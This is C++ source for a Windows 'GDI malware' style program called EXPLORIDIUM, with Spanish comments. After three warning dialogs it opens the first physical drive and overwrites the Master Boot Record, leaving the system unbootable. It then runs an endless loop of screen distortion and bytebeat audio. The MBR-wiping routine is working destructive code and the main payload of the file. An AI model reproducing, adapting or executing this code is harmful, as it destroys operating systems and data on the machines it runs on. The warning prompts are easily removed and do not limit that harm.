#include <windows.h>
#include <mmsystem.h>
#include <iostream>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "user32.lib")

int payloadActual = 1;
bool activo = true;

// --- MOTOR DE AUDIO (Tus 6 Fórmulas) ---
DWORD WINAPI AudioEngine(LPVOID lpParam) {
    HWAVEOUT hWaveOut;
    // Configuración: 8000Hz, Mono, 8-bit
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    
    char buffer[8000];
    WAVEHDR header = { buffer, 8000, 0, 0, 0, 0, 0, 0 };

    for (int t = 0; activo; t++) {
        switch(payloadActual) {
            case 1: buffer[t % 8000] = (char)(t/8>>(t>>9)*t/((t>>14&3)+4)*t); break;
            case 2: buffer[t % 8000] = (char)(t>>t%(t%2?t&32768?41:t&16384?51:61:34)&t>>4); break;
            case 3: buffer[t % 8000] = (char)(t*t/(1+(t>>9&t>>8))&128*t); break;
            case 4: buffer[t % 8000] = (char)((int)(t+(t^(t>>7))*0.5)*5|((t*2>>43|t*3*5>>4)*19)&(t*7>>172)/2*(t*((t>>9|t>>13)&15))&129|t*((t>>9|t>3)&25&t>>10)); break;
            case 5: { int a=t-2048; buffer[t % 8000] = (char)(((t&t>>6)&(t*(t>>((t&65535)>>12))))+((t*3/4&t>>12)&127)+(t*(a>>7&a>>8&a>>9&16)>>t/64)); break; }
            case 6: { int a=t&t>>6, b=t|t>>8, c=t|t>>7, d=t|t>>9; buffer[t % 8000] = (char)(a+b+c+d); break; }
        }
        
        if (t % 8000 == 0) {
            waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
            waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
            Sleep(1000);
        }
    }
    return 0;
}

// --- DESTRUCCIÓN DE MBR ---
void OverwriteMBR() {
    unsigned char mbr_data[512] = { 0xEB, 0x3E, 0x90 }; 
    mbr_data[510] = 0x55; mbr_data[511] = 0xAA;
    
    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (hDrive != INVALID_HANDLE_VALUE) {
        DWORD dwWritten;
        WriteFile(hDrive, mbr_data, 512, &dwWritten, 0);
        CloseHandle(hDrive);
    }
}

// --- ADVERTENCIAS YES/NO ---
void ShowWarnings() {
    if (MessageBoxA(NULL, "The software you are about to execute is POTENTIALLY DESTRUCTIVE. Continue?", "EXPLORIDIUM 1/3", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO) exit(0);
    if (MessageBoxA(NULL, "This will overwrite your MBR and destroy your OS. Are you sure?", "EXPLORIDIUM 2/3", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) == IDNO) exit(0);
    if (MessageBoxA(NULL, "LAST CHANCE: DO YOU WANT TO DESTROY THE SYSTEM NOW?", "EXPLORIDIUM 3/3", MB_YESNO | MB_ICONSTOP | MB_DEFBUTTON2) == IDNO) exit(0);
}

int main() {
    ShowWarnings();
    OverwriteMBR();

    // Iniciar hilo de audio
    CreateThread(NULL, 0, AudioEngine, NULL, 0, NULL);

    HDC hdc = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    DWORD tiempoInicio = GetTickCount();

    // Bucle infinito: Cambia de payload cada 30 segundos
    while (true) {
        DWORD seg = (GetTickCount() - tiempoInicio) / 1000;
        payloadActual = (seg / 30) + 1;
        if (payloadActual > 6) payloadActual = 6; // Se queda en el último bucle infinito

        // GDI Visuals
        BitBlt(hdc, rand()%10-5, rand()%10-5, sw, sh, hdc, 0, 0, NOTSRCERASE);
        if (payloadActual >= 4) {
             StretchBlt(hdc, 10, 10, sw-20, sh-20, hdc, 0, 0, sw, sh, SRCCOPY);
        }
        
        Sleep(10);
    }
    return 0;
}